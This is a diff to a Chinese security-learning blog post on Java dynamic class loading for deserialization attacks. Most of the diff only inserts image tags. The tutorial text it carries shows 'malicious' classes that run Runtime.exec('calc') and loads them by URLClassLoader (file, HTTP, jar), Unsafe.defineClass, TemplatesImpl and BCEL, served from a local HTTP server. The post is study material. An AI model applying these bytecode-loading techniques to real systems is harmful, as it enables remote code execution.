@@ -304,7 +304,7 @@
 
 <p>我们知道，Student 本身其实是一个抽象类，是通过 new 这个操作，将其实例化的，<strong>类加载器</strong>做的便是这个工作。</p>
 <p>ClassLoader 的工作如图所示</p>
-
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/ClassLoaderWork.png" class>
 
 <p>加载器也分多种加载器，每个加载器负责不同的功能。</p>
 <p>主要分为这四种加载器</p>
@@ -337,11 +337,11 @@
 <ul>
 <li>结果居然报错了！而且非常离谱</li>
 </ul>
-
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/ErrorStringFile.png" class>
 
 <p>我这不是已经定义了 main 方法吗？？为什么还会报错，这里就提到双亲委派机制了，双亲委派机制是从安全角度出发的。</p>
 <p>首先，我们要知道 Java 的类加载器是分很多层的，如图。</p>
-
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/ClassLoaderSequence.png" class>
 
 <p>我们的类加载器在被调用时，也就是在 new class 的时候，它是以这么一个顺序去找的 BOOT —&gt; EXC —-&gt; APP</p>
 <p>如果 BOOT 当中没有，就去 EXC 里面找，如果 EXC 里面没有，就去 APP 里面找。</p>
@@ -354,7 +354,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src.DynamicClassLoader;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 双亲委派的正确代码  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello&quot;</span>;  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();  </span><br><span class="line">  </span><br><span class="line"> System.out.println(student.getClass().getClassLoader());  </span><br><span class="line"> System.out.println(student.toString());  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>并把加载器打印出来</p>
-
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/SuccessClassFile.png" class>
 <p>我们定义的 Student 类在 APP 加载器中找到了。</p>
 <h2 id="0x03-各场景下代码块加载顺序"><a href="#0x03-各场景下代码块加载顺序" class="headerlink" title="0x03 各场景下代码块加载顺序"></a>0x03 各场景下代码块加载顺序</h2><ul>
 <li><p>这里的代码块主要指的是这四种</p>
@@ -378,7 +378,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src.DynamicClassLoader;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 代码块的启动器  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>运行结果如图</p>
-
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/InstanceFieldShow.png" class>
 
 <ul>
 <li><strong>结论：</strong></li>
@@ -389,7 +389,7 @@
 <p><strong>Main.java</strong></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src.DynamicClassLoader;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 代码块的启动器  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        Person.staticAction();  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/StaticAction.png" class>
 <ul>
 <li><strong>结论：</strong></li>
 </ul>
@@ -397,7 +397,7 @@
 <h3 id="场景三、对类中的静态成员变量赋值"><a href="#场景三、对类中的静态成员变量赋值" class="headerlink" title="场景三、对类中的静态成员变量赋值"></a>场景三、对类中的静态成员变量赋值</h3><p><strong>Main.java</strong></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src.DynamicClassLoader;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 代码块的启动器  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line"> 		Person.staticVar = <span class="number">1</span>;  </span><br><span class="line"> 	&#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/ValueStatic.png" class>
 
 <ul>
 <li><strong>结论：</strong></li>
@@ -439,7 +439,7 @@
 </blockquote>
 <p>我个人很喜欢把它比作 Dockerfile 里面，执行命令的一些代码，例如 <code>entrypoint</code> 这种。</p>
 <p>而字节码的诞生是为了让 JVM 的流通性更强，这是什么意思呢？看图便知。</p>
-
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/JavaBytes.png" class>
 
 <h3 id="2-类加载器的原理"><a href="#2-类加载器的原理" class="headerlink" title="2. 类加载器的原理"></a>2. 类加载器的原理</h3><p>根据前面各场景下代码块的加载顺序我们得知，在 loadClass() 方法被调用的时候，是不进行类的初始化的。</p>
 <p>代码：</p>
@@ -448,13 +448,13 @@
 <p>打一下断点，调试一下，断点打在 <code>ClassLoader.loadClass()</code> 的地方，也就是父类。为什么这么打断点是有原因的，因为最开始我们已知 “Person” 类它是 <code>Launcher@APPClassLoader</code>，它里面是有一个 <code>loadClass()</code> 方法的，但是它只有一个参数。所以断点下在 <code>ClassLoader.loadClass()</code> 之类</p>
 <p>开始调试</p>
 <p>调试先会走到 <code>ClassLoader.loadClass()</code>，这里其实 return 就多给了一个参数为 false；我们 ctrl + f7 跟进。又会回到 <code>Launcher@APPClassLoader</code> 这里。</p>
-
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/AppClassLoaderGetIN.png" class>
 
 <p>中间是一些简单的判断安全的过程，这里就不看了，继续往下走，直到 <code>return (super.loadClass(name, resolve));</code> 这里，继续跟进。也就是回到了之前的 <code>ClassLoader</code> 类。</p>
-
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/SecondClassLoader.png" class>
 
 <p>往下走，先检查类是否加载过，这里其实就是双亲委派的流程了。我们之前说委派机制是从最下面网上找，如果上面有就调用上面的，如果上面没有，就调用本身，也就是 AppClassLoader</p>
-
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/ParentLoader01.png" class>
 
 <p>这里 null 是因为最上面的 Bootstrap 类是 native 类，也就是之前说过的 C 写的源码，所以为 null。</p>
 <p>继续往下走，因为 APP 和 Ext 的父类是 URLClassLoader，所以这里的 findClass() 是会去找到 URLClassLoader 的。</p>
@@ -475,19 +475,19 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// URLClassLoader 的 file 协议  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> &#123;  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line"> &#125; <span class="keyword">catch</span> (IOException e)&#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line"> &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>接着，点小锤子编译一下，我们会在 out 的 src 文件夹下发现编译过的 .class 文件。接着，我们进行一下复制的操作，将其复制到 E 盘。</p>
-
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/Copy.png" class>
 
 <p>接着，我们编写 URLClassLoader 的启动类</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src.DynamicClassLoader.URLClassLoader;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.net.URL;  </span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// URLClassLoader 的 file 协议  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileRce</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>  </span><br><span class="line">                (<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;file:///E:\\&quot;</span>)&#125;);  </span><br><span class="line"> <span class="type">Class</span> <span class="variable">calc</span> <span class="operator">=</span> urlClassLoader.loadClass(<span class="string">&quot;src.DynamicClassLoader.URLClassLoader.Calc&quot;</span>);  </span><br><span class="line"> calc.newInstance();  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>成功弹出了计算器</p>
-
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/FileURLClassLoader.png" class>
 
 <h4 id="HTTP-协议"><a href="#HTTP-协议" class="headerlink" title="HTTP 协议"></a>HTTP 协议</h4><p>在 <code>Calc.class</code> 文件目录下执行 <code>python3 -m http.server 9999</code>，起一个 http 服务。我这里是 E 盘根目录，就在 E 盘起。</p>
 <p>接着，我们编写恶意利用类</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src.DynamicClassLoader.URLClassLoader;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.net.URL;  </span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// URLClassLoader 的 HTTP 协议  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HTTPRce</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://127.0.0.1:9999&quot;</span>)&#125;);  </span><br><span class="line"> <span class="type">Class</span> <span class="variable">calc</span> <span class="operator">=</span> urlClassLoader.loadClass(<span class="string">&quot;src.DynamicClassLoader.URLClassLoader.Calc&quot;</span>);  </span><br><span class="line"> calc.newInstance();  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/HTTPURLClassLoader.png" class>
 
 <h4 id="file-jar-协议"><a href="#file-jar-协议" class="headerlink" title="file+jar 协议"></a>file+jar 协议</h4><p>先将我们之前的 class 文件打包一下，打包为 jar 文件。</p>
 <p>去到源 .class 文件下，别去复制的地方，运行命令</p>
@@ -496,7 +496,7 @@
 <p>接着，我们修改启动器，调用恶意类</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src.DynamicClassLoader.URLClassLoader;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.net.URL;  </span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// URLClassLoader 的 file + jarpublic class JarRce &#123;  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;jar:file:///E:\\Calc.jar!/&quot;</span>)&#125;);  </span><br><span class="line"> <span class="type">Class</span> <span class="variable">calc</span> <span class="operator">=</span> urlClassLoader.loadClass(<span class="string">&quot;src.DynamicClassLoader.URLClassLoader.Calc&quot;</span>);  </span><br><span class="line"> calc.newInstance();  </span><br><span class="line">  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/JarFileURLClassLoader.png" class>
 
 <h4 id="HTTP-jar-协议"><a href="#HTTP-jar-协议" class="headerlink" title="HTTP + jar 协议"></a>HTTP + jar 协议</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src.DynamicClassLoader.URLClassLoader;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.net.URL;  </span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// URLClassLoader 的 HTTP + jarpublic class HTTPJarRce &#123;  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;jar:http://127.0.0.1:9999/Calc.jar!/&quot;</span>)&#125;);  </span><br><span class="line"> <span class="type">Class</span> <span class="variable">calc</span> <span class="operator">=</span> urlClassLoader.loadClass(<span class="string">&quot;src.DynamicClassLoader.URLClassLoader.Calc&quot;</span>);  </span><br><span class="line"> calc.newInstance();  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -505,7 +505,7 @@
 </ul>
 <p>最灵活的肯定是 http 协议的加载</p>
 <h3 id="4-利用-ClassLoader-defineClass-直接加载字节码"><a href="#4-利用-ClassLoader-defineClass-直接加载字节码" class="headerlink" title="4. 利用 ClassLoader#defineClass 直接加载字节码"></a>4. 利用 ClassLoader#defineClass 直接加载字节码</h3><p>不管是加载远程 class 文件，还是本地的 class 或 jar 文件，Java 都经历的是下面这三个方法调用。</p>
-
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/JavaRun.png" class>
 
 <p>从前面的分析可知：</p>
 <ul>
@@ -515,7 +515,7 @@
 </ul>
 <p>默认的 <code>ClassLoader#defineClass</code> 是一个 native 方法，逻辑在 JVM 的C语言代码中。</p>
 <p>我们跟进 ClassLoader 当中，去看一看 <code>DefineClass</code> 是怎么被调用的。</p>
-
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/DefineClass.png" class>
 
 <p>解释一下 <code>defineClass</code></p>
 <p><code>name</code>为类名，<code>b</code>为字节码数组，<code>off</code>为偏移量，<code>len</code>为字节码数组的长度。</p>
@@ -532,7 +532,7 @@
 <li>Unsafe中也存在<code>defineClass()</code>方法，本质上也是 <code>defineClass</code> 加载字节码的方式。</li>
 </ul>
 <p>跟进去看一看 <code>Unsafe</code> 的 <code>defineClass()</code> 方法</p>
-
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/UnsafeClassLoader.png" class>
 
 <p>这里的 <code>Unsafe</code> 方法，是采用单例模式进行设计的，所以虽然是  public 方法，但无法直接调用，因为我们用反射来调用它。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src.DynamicClassLoader.UnsafeClassLoader;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnsafeClassLoaderRce</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();  </span><br><span class="line"> Class&lt;Unsafe&gt; unsafeClass = Unsafe.class;  </span><br><span class="line"> <span class="type">Field</span> <span class="variable">unsafeField</span> <span class="operator">=</span> unsafeClass.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);  </span><br><span class="line"> unsafeField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"> <span class="type">Unsafe</span> <span class="variable">classUnsafe</span> <span class="operator">=</span> (Unsafe) unsafeField.get(<span class="literal">null</span>);  </span><br><span class="line"> <span class="type">Method</span> <span class="variable">defineClassMethod</span> <span class="operator">=</span> unsafeClass.getMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class,  </span><br><span class="line"> <span class="type">int</span>.class, <span class="type">int</span>.class, ClassLoader.class, ProtectionDomain.class);  </span><br><span class="line"> <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\Calc.class&quot;</span>));  </span><br><span class="line"> <span class="type">Class</span> <span class="variable">calc</span> <span class="operator">=</span> (Class) defineClassMethod.invoke(classUnsafe, <span class="string">&quot;src.Calc&quot;</span>, code, <span class="number">0</span>, code.length, classLoader, <span class="literal">null</span>);  </span><br><span class="line"> calc.newInstance();  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -540,10 +540,10 @@
 <h3 id="6-TemplatesImpl-加载字节码"><a href="#6-TemplatesImpl-加载字节码" class="headerlink" title="6. TemplatesImpl 加载字节码"></a>6. TemplatesImpl 加载字节码</h3><ul>
 <li>我们先跟进 TemplatesImpl 这个包中看 TemplatesImpl 的结构图</li>
 </ul>
-
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/TemplateImplBag.png" class>
 
 <p>可以看到在 <code>TemplatesImpl</code> 类中还有一个内部类 <code>TransletClassLoader</code>，这个类是继承 <code>ClassLoader</code>，并且重写了 <code>defineClass</code> 方法。</p>
-
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/TemplateImplCode.png" class>
 
 <ul>
 <li>简单来说，这里的 <code>defineClass</code> 由其父类的 protected 类型变成了一个 default 类型的方法，可以被类外部调用。</li>
@@ -566,14 +566,14 @@
 </blockquote>
 <ul>
 <li>主要是三个私有类的属性<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Calc&quot;</span>); </span><br></pre></td></tr></table></figure>
-</li>
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/TransletInstance.png" class></li>
 </ul>
 <p>显然，<code>_name</code> 不能为 null，我们才能进入链子的下一部分。<br>链子的下一部分为 <code>defineTransletClasses</code>，我们跟进去。</p>
-
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/defineTransletClasses.png" class>
 
 <p><code>_tfactory</code> 需要是一个 <code>TransformerFactoryImpl</code> 对象，因为 <code>TemplatesImpl#defineTransletClasses()</code> 方法里有调用到 <code>_tfactory.getExternalExtensionsMap()</code> ，如果是 null 会出错。</p>
 <p>弹计算器成功</p>
-
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/TemplatesImplSuccess.png" class>
 
 <h3 id="7-利用-BCEL-ClassLoader-加载字节码"><a href="#7-利用-BCEL-ClassLoader-加载字节码" class="headerlink" title="7. 利用 BCEL ClassLoader 加载字节码"></a>7. 利用 BCEL ClassLoader 加载字节码</h3><ul>
 <li>什么是 BCEL？</li>
@@ -584,7 +584,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src.DynamicClassLoader.URLClassLoader;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">   </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> &#123;  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span 